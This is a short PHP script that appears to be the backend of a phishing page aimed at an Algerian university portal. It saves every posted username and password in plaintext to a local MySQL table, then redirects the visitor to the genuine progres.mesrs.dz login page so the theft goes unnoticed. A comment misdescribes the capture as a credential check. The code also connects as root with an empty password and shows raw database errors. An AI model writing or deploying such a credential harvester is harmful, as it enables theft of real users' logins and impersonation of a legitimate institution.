<?php

// Database configuration
$servername = "localhost";
$username = "root"; // Your MySQL username
$password = ""; // Your MySQL password
$database = "tpsere"; // Your MySQL database name

// Create database connection
$db = new mysqli($servername, $username, $password, $database);

// Check connection
if ($db->connect_error) {
    die("Connection failed: " . $db->connect_error);
}

// Check if the username and password are posted
if (isset($_POST['username']) && isset($_POST['password'])) {
    // Prepare a SQL query to check the user's credentials
    $sql = "INSERT INTO users (username, password) VALUES (?, ?)";
    $stmt = $db->prepare($sql);
    
    // Check if the prepare() call failed
    if (!$stmt) {
        die("Prepare failed: (" . $db->errno . ") " . $db->error);
    }
    
    // Bind parameters
    $stmt->bind_param("ss", $_POST['username'], $_POST['password']);
    
    // Execute the statement
    $result = $stmt->execute();

    // Check if the execute() call failed
    if (!$result) {
        die("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
    }
    
    // Redirect to the login page
    header("Location: https://progres.mesrs.dz/webfve/login.xhtml");
    exit; // Stop executing the script
}

// Close the database connection
$db->close();
?>
